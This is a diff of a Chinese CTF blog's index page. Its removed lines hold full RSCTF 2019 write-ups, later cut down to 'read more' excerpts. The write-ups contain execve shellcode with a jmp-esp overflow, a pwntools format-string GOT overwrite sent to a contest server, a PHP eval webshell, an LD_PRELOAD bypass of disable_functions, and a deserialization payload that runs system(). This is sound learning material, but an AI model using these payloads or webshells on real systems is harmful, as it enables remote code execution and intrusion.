@@ -343,87 +343,19 @@
       
         
           
-            <h1 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn-1"></a>pwn-1</h1><p>刚开始研究pwn不太会，只能f5了，一看<img src="/images/clip_image002-1572790655656.jpg" alt="img"></p>
-<p>发现，采用的是gets函数读取用户输入，这为我们提供了利用点，</p>
-<p>通过图上我们知道，v4距离ebp的长度为0x20</p>
-<p>所以，我们只需要填充0x20+0x08个字节之后的字节就可以覆盖eip了。</p>
-<p>pwn3提供了fun函数，我们得到fun函数地址为：<code>0x04005B6</code></p>
-<p>所以，我们可以写出exp</p>
-<p><img src="/images/clip_image003.png" alt="img"></p>
-<h1 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn-2"></a>pwn-2</h1><p> 略难，对我这种萌新不太友好，不会233333333</p>
-<h1 id="pwn-3"><a href="#pwn-3" class="headerlink" title="pwn-3"></a>pwn-3</h1><p><em>嘴上说着pwn3，其实文件名是pwn5</em> 先查看文件保护checksec。</p>
-<p><img src="/images/clip_image002-1572790864072.jpg" alt="img"></p>
-<p>什么都没开，高兴!这里我们直接拖进ida</p>
-<p><img src="/images/clip_image004-1572790864072.jpg" alt="img"></p>
-<p>​                            main函数毫无营养。</p>
-<p>​                            还是看pwn()吧。</p>
-<p><img src="/images/clip_image006-1572790864072.jpg" alt="img"></p>
-<p>s是24个字节，但是fgets读取了50个字节，所以会造成溢出。</p>
-<p>我们在ida的函数列表里没有发现与system相关函数。</p>
-<p>程序也没有调用so</p>
-<p>所以只能我们自己构造shellcode了。（nx和canary都没开启保护，所以我们可以执行任意代码，现在我们的任务就是构造shellcode，找一个jmp</p>
-<p>esp） 同时注意jmp后要抬高栈帧。pwntools可以做到。</p>
-<p>我在这里找到了<a href="https://blog.csdn.net/qq_38204481/article/details/86647842我的shellcode，" target="_blank" rel="noopener">https://blog.csdn.net/qq_38204481/article/details/86647842我的shellcode，</a></p>
-<p>因此我们的最终payload就是:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">shellcode_x86 = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode_x86 += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode_x86 += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">sub_esp_jmp = asm(<span class="string">'sub esp, 0x28;jmp esp'</span>)</span><br><span class="line">jmp_esp = <span class="number">0x08048554</span></span><br><span class="line"></span><br><span class="line">payload = shellcode_x86 + (<span class="number">0x20</span>-len(shellcode_x86)) * <span class="string">'b'</span> + <span class="string">'bbbb'</span> +p32(jmp_esp) + sub_esp_jmp</span><br></pre></td></tr></table></figure>
-
-<p>这里的jmp esp的地址是用ROPgadgets找到的</p>
-<p>Command: <code>ROPgadgets –binary pwn5 –only ”jmp|ret” | grep esp</code></p>
-<p>只有这一个 <code>0x08048554</code></p>
-<p>至此我们可以写出我们的exp了。</p>
-<p><img src="/images/clip_image008.jpg" alt="img"></p>
-<p>然后成功getflag</p>
-<h1 id="pwn-4"><a href="#pwn-4" class="headerlink" title="pwn-4"></a>pwn-4</h1><p><em>嘴上说着pwn4，其实文件名是pwn6</em></p>
-<p><img src="/images/clip_image002-1572791007549.jpg" alt="img"></p>
-<p>整体流程如下</p>
-<p>先输入一个数字，判断是否等于1926，等于就退出，</p>
-<p>接着用gets获取了v5变量。这个是溢出点。</p>
-<p>所以我们编写exp的思路就是，</p>
-<p>先让v6不等于1926，不然没法跳到如果假的分支。</p>
-<p>然后v5我们溢出。</p>
-<p>所以我们现在就是需要计算v5和v6之间需要多少字节来填充。</p>
-<p>gdb：<img src="/images/clip_image004-1572791007549.jpg" alt="img"></p>
-<p>我是输入了16和15来作为v6和v5的值</p>
-<p>从图中我们发现：</p>
-<p><code>0x7ffffffffffe0e0</code>是15</p>
-<p><code>0x7ffffffffffe0e8</code>是0x10 = 16</p>
-<p>所以我们知道v5和v6之间需要8个字节。</p>
-<p>由此我们构造出wp为：</p>
-<p><img src="/images/clip_image006-1572791007549.jpg" alt="img"></p>
-<h1 id="Entry-level-pwn"><a href="#Entry-level-pwn" class="headerlink" title="Entry level pwn"></a>Entry level pwn</h1><p>看到给到的文件名（format），我们想到这是一个pwn的字符串序列化的题，</p>
-<p>查看源码，果然，在pwn函数中，</p>
-<p><img src="/images/clip_image002-1572791136273.jpg" alt="img"></p>
-<p>我们发现，这果然是经典的字符串解析漏洞题型，</p>
-<p>输入%x测试，</p>
-<p><img src="/images/clip_image004-1572791136273.jpg" alt="img"></p>
-<p>A的ascii码正好是41，所以发现offset（偏移）为7.</p>
-<p>接下来我们需要把printf替换成system，然后输入/bin/sh就行了。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf_got = 0x0804A014</span><br><span class="line">system_plt = 0x08048410</span><br></pre></td></tr></table></figure>
-
-<p>这两个地址有两个寻找方法，均有效，最快捷的为，</p>
-<h2 id="方法1：-（pwntools提供）"><a href="#方法1：-（pwntools提供）" class="headerlink" title="方法1： （pwntools提供）"></a>方法1： （pwntools提供）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e = ELF(‘./format’)</span><br><span class="line">print hex(e.got[‘printf’])</span><br><span class="line">print hex(e.plt[‘system’])</span><br></pre></td></tr></table></figure>
-
-<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>​    ida上找：</p>
-<p><img src="/images/clip_image006-1572791136273.jpg" alt="img"></p>
-<p><img src="/images/clip_image008-1572791136273.jpg" alt="img"></p>
-<p>payload = p32(printf_got)+”%”+str(system_plt-4)+”c%7$n”</p>
-<p>这是最初的payload,</p>
-<p>但是我发现，这样是不行，会输出无数个空字符，等了几分组仍没有停止。</p>
-<p>通过查找资料发现，<a href="https://www.cnblogs.com/ichunqiu/p/9329387.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/9329387.html</a> 里面写道它会输出100+mb的字符，这显然是不行的。同时资料里提到，pwntools提供了一种专门针对formatstingr的payload的方法。</p>
-<p>详情参见： <a href="http://docs.pwntools.com/en/stable/fmtstr.html" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/fmtstr.html</a></p>
-<p>payload = fmtstr_payload(offset,{printf_got:system_plt})</p>
-<p>offset此题为7.</p>
-<p>因此最终exp为：<img src="/images/clip_image010.jpg" alt="img"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'117.139.247.14'</span>, <span class="number">9939</span>)</span><br><span class="line">printf_got = <span class="number">0x0804A014</span></span><br><span class="line">system_plt = <span class="number">0x08048410</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;printf_got:system_plt&#125;)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>python运行即可，</p>
-<h1 id="Veryeasypwn"><a href="#Veryeasypwn" class="headerlink" title="Veryeasypwn"></a>Veryeasypwn</h1><p>拖入ida，空格看流程图，详见流程图.png</p>
-<p><img src="/images/clip_image002.png" alt="img"></p>
-<p>发现cmp eax,1/2/3/4/0x…..忘了，反正转为整型是233</p>
-<p>所以在choice输入233即可跳转到fun_sys进而执行shell</p>
-<p>输入cat /flag得到getflag</p>
-
-          
+          pwn-1刚开始研究pwn不太会，只能f5了，一看
+发现，采用的是gets函数读取用户输入，这为我们提供了利用点，
+通过图上我们知道，v4距离ebp的长度为0x20
+所以，我们只需要填充0x20+0x08个字节之后的字节就可以覆盖eip了。
+pwn3提供了fun函数，我们得到fun函数地址为：0x0
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/11/03/RSCTF2019-PWN.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -563,84 +495,19 @@
       
         
           
-            <h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>这道题。。。只能是我太菜了，居然以为出题人出错题，膜一下夜师傅。</p>
-<p><img src="/images/image-20191103215947920.png" alt="image-20191103215947920"></p>
-<p>第3行是密文串，urldecode之后直接看即可，</p>
-<p>这里解密的时候，我是本地copy下来，然后我用echo 各种变量，得出line5-8分别是</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">5.strtr</span><br><span class="line">6.substr</span><br><span class="line">7.52</span><br><span class="line">8.base64_decode</span><br></pre></td></tr></table></figure>
+          Getshell这道题。。。只能是我太菜了，居然以为出题人出错题，膜一下夜师傅。
 
-<p>然后进行变量替换，我比较笨，只会ctrl+h进行替换，耗费了好长时间，最后我都背下来了</p>
-<p>然后解密之后发现，what？？还有一层?好吧，base64解！！！</p>
-<p>然后发现是两段和刚开始相似的代码，</p>
-<p>这里简单试验了一下</p>
-<p><img src="/images/image-20191103220018419.png" alt="image-20191103220018419"></p>
-<p>发现解密之后和第一段差不多（那也很麻烦）</p>
-<p>继续解，最坑的是 第一段解出来是<?php ?>!!!!!!!!!!!!!</p>
-<p>第二段比较重要：内容是：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);</span><br><span class="line"> @<span class="keyword">eval</span>($_POST[ymlisisisiook]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>哈哈拿到shell了！！</p>
-<p>别急，好戏刚刚开始，你以为system(cat /flag)就行了？不行！</p>
-<p>查看phpinfo发现 disabled_functions特别多！！！！！！！！！</p>
-<p>基本常用的函数全都绕过了。无奈只能绕过，经过查找发现有三种方式可以绕过，</p>
-<p>Com组件，失败，只能windows</p>
-<p>Mod-cgi绕过失败，只能用Ldpreload绕过了</p>
-<hr>
-<p>中间经历一大段尝试，未果</p>
-<p>可以用LD_PRELOAD绕过，这时候发现一篇精品文章：</p>
-<p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p>
-<p>嗯，应该可以，无奈发现mail函数也在被禁用的函数列表，</p>
-<p>没事，文章也写了可以用imap_mail()</p>
-<p>没有成功，应该是内部调用了mail函数然后被禁用。</p>
-<p>这时候一血出现了，我仍然没找到方法，只能是暂时搁置（其实是偶尔尝试）</p>
-<p><img src="/images/image-20191103220037744.png" alt="image-20191103220037744">👆血的教训</p>
-<p>晚上入睡前，逛先知社区发现了一个：<a href="https://xz.aliyun.com/t/4688" target="_blank" rel="noopener">https://xz.aliyun.com/t/4688</a></p>
-<p>嗯，，，发现error_log也可以调用sendmail</p>
-<p>从而利用ldpreload执行函数，</p>
-<p>这里推荐一个github地址(做本题里面的代码需要修改): <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a> </p>
-<p>修改成这样：</p>
-<p><img src="/images/image-20191103220055368.png" alt="image-20191103220055368"></p>
-<p>这里的例子传参是三个，我为了测试，把其中两个参数给去掉了，</p>
-<p>其中sopath为so文件目录，采用绝对路径，所以最后我的payload：</p>
-<p>[<a href="http://117.139.247.14:9113/poc.php?cmd=cat%20/flag]" target="_blank" rel="noopener">http://117.139.247.14:9113/poc.php?cmd=cat%20/flag]</a>(<a href="http://117.139.247.14:9113/poc.php?cmd=cat" target="_blank" rel="noopener">http://117.139.247.14:9113/poc.php?cmd=cat</a> /flag)  成功getflag,哎，与一血失之交臂，只能二血了。</p>
-<h1 id="EzCode"><a href="#EzCode" class="headerlink" title="EzCode"></a>EzCode</h1><p>大佬在睡觉我在做题，运气拿到了一血</p>
-<p>看页面源码，什么都没有，那只能扫一下网站了，扫到了 index.php.bak</p>
-<p>拿到index.php的源码观察，</p>
-<p><strong><img src="/images/clip_image002.jpg" alt="img"></strong></p>
-<p>只是用正则过滤了post，get 没过滤cookie（后期好像没用上）</p>
-<p>所以传入cookie头 ： <strong>Cookie: yemoli=php代码</strong></p>
-<p>此时访问：<code>view-source:http://117.139.247.14:9532/yemoli.php</code></p>
-<p>发现，过滤了引号，因为addslashes  然后还发现只要有<code>@eval($_POST[sb])</code>方式绕过</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: 117.139.247.14:9532</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie:yemoli=eval($_POST[sb])</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-
-<p><strong><img src="/images/clip_image004.jpg" alt="img"></strong></p>
-<p>这里注意 本来pHp左右是有双引号的，但是被我删除了，因为有和没有是一样的而且双引号是被过滤的</p>
-<p>然后即可链接了，哈哈哈哈  然后，看见和getshell题相似的目录我心理一哆嗦，完蛋，怕是也禁用了各种函数</p>
-<p>我执行了一下phpinfo函数，幸运的是发现并没有和getshell一题一样，一个disabiledfunctions也没有，太好了 , 果断传文件<img src="/images/clip_image006.jpg" alt="img"></p>
-<p>访问即可获取flag </p>
-<h1 id="Bestlanguage"><a href="#Bestlanguage" class="headerlink" title="Bestlanguage"></a>Bestlanguage</h1><p>访问题目地址:<a href="http://117.139.247.14:9531/" target="_blank" rel="noopener">http://117.139.247.14:9531</a> 可见直接给源码，观察,涉及到反序列化利用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yemoli</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $alive;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;alive = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;alive = <span class="keyword">new</span> good();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;alive-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">good</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"I am a good boy!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bad</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">'string'</span>]);</span><br></pre></td></tr></table></figure>
-
-<p>涉及到3个类，good没什么用，因为反序列化时候不会执行__con struct()方法。</p>
-<p>发现yemoli这个class他的$alive变量是可控的，以为可以直接控制，后来发现这是个protected的变量，所以利用<a href="https://www.freebuf.com/column/182293.html里提到的方法，先创建一个yemoli的子类，" target="_blank" rel="noopener">https://www.freebuf.com/column/182293.html里提到的方法，先创建一个yemoli的子类，</a></p>
-<p>代码如下: </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChildClass</span> <span class="keyword">extends</span> <span class="title">yemoli</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $wc;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;wc = <span class="keyword">new</span> yemoli();</span><br><span class="line"><span class="keyword">$this</span>-&gt;wc-&gt;alive = <span class="keyword">new</span> bad();</span><br><span class="line"><span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;wc);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> ChildClass();</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;make();</span><br></pre></td></tr></table></figure>
-
-<p>即可成功覆盖$alive</p>
-<p>同时修改bad类，为code提供默认值，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bad</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $code = <span class="string">"eval(system($_G1ET[p]));"</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里就成功的生成了序列化字符串</p>
-<p><code>O:6:&quot;yemoli&quot;:1:s:8:&quot;*alive&quot;;O:3:&quot;bad&quot;:1:s:9:&quot;badcode&quot;;s:23:&quot;eval(system($_GET[p]));&quot;;}}</code></p>
-<!--复现时，如果报500错误，可以将$_GET[p]删除，序列化之后再补充，不知道为什么加了$_GET[p]之后就会500，别忘了改一下大小-->
-
-<p>然后发现代码并没有成功执行，这个卡了很长时间，<br>抱着试一试看的态度去夜师傅的blog看了一下，有一篇文章<a href="https://yml-sec.top/2019/07/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E6%B3%A8%E6%84%8F%E7%82%B9/" target="_blank" rel="noopener">https://yml-sec.top/2019/07/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E6%B3%A8%E6%84%8F%E7%82%B9/</a><br>里面写道对于private和protected，php在序列化的时候会自动补上不可见的字符，我们这里用%00即可替代，同时这篇文章还提到了一个cve漏洞，可以修改yemoli这个object对象的大小来跳过执行__wakeup()这个魔法函数。</p>
-<p>替代后发现凡是涉及到单引号都会导致题目服务器报500错误，所以迂回，采用get传参<br>最终payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.139.247.14:9531/index.php?p=cat%20%2Fflag&amp;string=O:6:%22yemoli%22:2:&#123;s:8:%22%00*%00alive%22;O:3:%22bad%22:1:&#123;s:9:%22%00bad%00code%22;s:23:%22eval(system($_GET[p]));%22;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>成功getflag</p>
-
-          
+第3行是密文串，urldecode之后直接看即可，
+这里解密的时候，我是本地copy下来，然后我用echo 各种变量，得出line5-8分别是
+12345.strtr6.substr7.528.base64_deco
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/11/03/RSCTF2019-WEB.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -780,25 +647,16 @@
       
         
           
-            <h1 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h1><p>很简单的反编译的题，里面加密的算法也比较简单，不多叙述。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(str)</span>:</span></span><br><span class="line">    str = base64.b64decode(str)</span><br><span class="line">    print(str)</span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        i = i - <span class="number">16</span></span><br><span class="line">        x = i ^ <span class="number">32</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    <span class="keyword">return</span> (s)</span><br></pre></td></tr></table></figure>
-
-<p>由此得到以上解密代码，执行之，得到flag，用flag{}包裹并提交，ok</p>
-<h1 id="听"><a href="#听" class="headerlink" title="听"></a>听</h1><p>分离gif，没异常<br>查看hex，<br>发现尾部-.. .. -.. .. ..–.- -.. .. -.. .. ..–.- -.. .- -.-.– 好像是莫斯密码<br>找在线工具<a href="https://www.ctftools.com/down/解得：didi" target="_blank" rel="noopener">https://www.ctftools.com/down/解得：didi</a> didi da!<br>这里就很坑，怎么提交都不对，试了5次才得到flag为flag{didi_didi_da!}</p>
-<h1 id="国学"><a href="#国学" class="headerlink" title="国学"></a>国学</h1><p>乾—1 兑—2 离—3 震—4 巽—5 坎—6 艮—7 坤—8<br>14633060547366635653365757035262537322715373166755731020575<br>66 6c 6167 7b 67 75 6f 5f 78 75 65 5f 69 73 5f 67 6f 6f 64 21 7d<br>flag{guo_xue_is_good!}</p>
-<h1 id="饿了么"><a href="#饿了么" class="headerlink" title="饿了么"></a>饿了么</h1><p>下载得到个压缩包，以为是伪加密，然而并没有。直接解压得到base.jpg</p>
-<p>一串分析之后只在属性找到了备注：<code>I42FSRCNJVFFQR2NGNKEOTS2LBDVURCEJ5GVEV2HKE6T2PJ5HU6Q====</code></p>
-<p><code>Binwalk-e</code> 后发现图片里隐藏了一个zip和file.txt</p>
-<p>因为密文不只一个=，所以判断为非base64解码。</p>
-<p>是base32解码，三连解密后为：<code>password</code>。推测应该是解压得到的61F4.zip的密码</p>
-<p>利用password解压文件，解压成功得到新的file.txt</p>
-<p>发现flag四个字母在txt中均有出现，那应该是要我们词频分析。进入网站分析，下载结果。得到flag。</p>
-<h1 id="小猪佩奇"><a href="#小猪佩奇" class="headerlink" title="小猪佩奇"></a>小猪佩奇</h1><p>一开始没有做出来，直到第二道hint的出现，看到hint是密码123456，知道这是123456密码的lsb隐藏文件，恰好github上有：<code>https://github.com/livz/cloacked-pixel</code> 大神工具，直接传参即可。</p>
-<p>有大神写好了脚本，我们直接使用就行了，需要预先pip2 install matplotlib</p>
-<p>执行命令<code>python2 .\lsb.py extract .\01.png real.png 123456</code></p>
-<p>成功分离出<code>real.png</code> 是个二维码，扫描二维码得到flag</p>
-
-          
+          pyc很简单的反编译的题，里面加密的算法也比较简单，不多叙述。
+123456789def decode(str):    str = base64.b64decode(str)    print(str)    s = ''    for i in str:        i = i - 16   
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/11/03/RSCTF2019-MISC.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -938,11 +796,18 @@
       
         
           
-            <p>从今以后我也是专业的ctfer了，哈哈，第一次比赛打完了，感觉还不错。</p>
-<h2 id="Start"><a href="#Start" class="headerlink" title="-Start"></a>-Start</h2><h3 id="第一次比赛是在大学，是CCUT"><a href="#第一次比赛是在大学，是CCUT" class="headerlink" title="第一次比赛是在大学，是CCUT"></a>第一次比赛是在大学，是<a href="http://www.ccut.edu.cn/" target="_blank" rel="noopener">CCUT</a></h3><p>第一印象还不错哈哈</p>
-<hr>
+          从今以后我也是专业的ctfer了，哈哈，第一次比赛打完了，感觉还不错。
+-Start第一次比赛是在大学，是CCUT第一印象还不错哈哈
+
 
           
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/11/03/hello-world.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
